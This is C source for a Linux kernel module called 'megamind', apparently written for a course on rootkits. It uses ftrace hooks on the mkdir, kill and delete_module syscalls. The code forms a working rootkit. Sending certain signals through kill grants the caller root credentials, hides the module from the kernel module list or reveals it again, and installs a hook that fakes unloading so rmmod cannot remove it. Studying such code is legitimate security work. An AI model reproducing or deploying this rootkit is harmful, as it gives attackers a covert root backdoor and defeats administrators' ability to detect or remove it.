#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Felix Tanaka (z5478466)");
MODULE_DESCRIPTION("megamind");
MODULE_VERSION("0.0.1");

/*find_address*/
static unsigned long find_address(const char *name) {
    struct kprobe kp = {
        .symbol_name = name
    };
    unsigned long address;

    if (register_kprobe(&kp) < 0) {
        return 0;
    }

    address = (unsigned long) kp.addr;
    unregister_kprobe(&kp);
    return address;
}

/*ftrace utility*/
#define HOOK(_name, _hook, _orig)     \
    {                                 \
        .name = (_name),              \
        .function = (_hook),          \
        .original = (_orig),          \
    }

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

static int resolve_hook_address(struct ftrace_hook *hook) {
    hook->address = find_address(hook->name);

    if (!hook->address) {
        return -ENOENT;
    }

    *((unsigned long *) hook->original) = hook->address + MCOUNT_INSN_SIZE;

    return 0;
}

static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs) {
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    regs->ip = (unsigned long)hook->function;
}

static int install_hook(struct ftrace_hook *hook) {
    int err;
    err = resolve_hook_address(hook);
    if (err) {
        return err;
    }

    hook->ops.func = ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        return err;
    }

    return 0;
}

static void remove_hook(struct ftrace_hook *hook) {
    int err;
    err = unregister_ftrace_function(&hook->ops);
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
}

static int install_hooks(struct ftrace_hook *hooks, size_t count) {
    int err;
    for (size_t i = 0; i < count; i++) {
        err = install_hook(&hooks[i]);
        if (err) {
            while (i != 0) {
                remove_hook(&hooks[--i]);
            }
            return err;
        }
    }

    return 0;
}

static void remove_hooks(struct ftrace_hook *hooks, size_t count) {
    for (size_t i = 0; i < count; i++) {
        remove_hook(&hooks[i]);
    }
}

/*hooking mkdir*/
static asmlinkage int (*orig_mkdir)(const struct pt_regs *);

static asmlinkage int mkdir_hook(const struct pt_regs *regs) {
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long string_len = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if (string_len > 0) {
        pr_info("megamind: mkdir called with pathname %s\n", dir_name);
    }
    
    orig_mkdir(regs);
    return 0;
}

/*set root*/
static void set_root(void) {
    struct cred *root;
    root = prepare_creds();

    if (root == NULL) {
        return;
    }

    root->uid.val = 0;
    root->gid.val = 0;
    root->euid.val = 0;
    root->egid.val = 0;
    root->suid.val = 0;
    root->sgid.val = 0;
    root->fsuid.val = 0;
    root->fsgid.val = 0;

    commit_creds(root);
}

/*hiding and showing megamind*/
static struct list_head *prev_module;

static void hide_megamind(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static void show_megamind(void) {
    list_add(&THIS_MODULE->list, prev_module);
}

/*rmmod hook*/
static asmlinkage int (*orig_delmod)(const struct pt_regs *);

static asmlinkage int delmod_hook(const struct pt_regs *regs) {
    pr_info("megamind: unloaded (fake)\n");
    hide_megamind();
    pr_info("megamind: hidden\n");

    return 0;
    /*return orig_delmod(regs);*/
}

static struct ftrace_hook delete_module_hook = HOOK("__x64_sys_delete_module", delmod_hook, &orig_delmod);

/*hooking kill*/
static asmlinkage int (*orig_kill)(const struct pt_regs *);

static asmlinkage int kill_hook(const struct pt_regs *regs) {
    int sig = regs->si;

    if (sig == 64) {
        set_root();
        pr_info("megamind: giving root\n");
        return 0;
    }

    if (sig == 63) {
        hide_megamind();
        pr_info("megamind: hidden\n");
        return 0;
    }

    if (sig == 62) {
        show_megamind();
        pr_info("megamind: visible\n");
        return 0;
    }

    if (sig == 61) {
        install_hook(&delete_module_hook);
        pr_info("megamind: disabled rmmod\n");
        return 0;
    }

    return orig_kill(regs);
}

/*preparing hooks*/
static struct ftrace_hook initial_hooks[] = {
    HOOK("__x64_sys_mkdir", mkdir_hook, &orig_mkdir),
    HOOK("__x64_sys_kill", kill_hook, &orig_kill),
};

/*kernel module loading and unloading*/
static int __init megamind_init(void) {
    pr_info("megamind: loaded\n");
    int err;
    err = install_hooks(initial_hooks, ARRAY_SIZE(initial_hooks));
    if (err) {
        return err;
    }

    return 0;
}

static void __exit megamind_exit(void) {
    remove_hooks(initial_hooks, ARRAY_SIZE(initial_hooks));

    pr_info("megamind: unloaded\n");
}

module_init(megamind_init);
module_exit(megamind_exit);
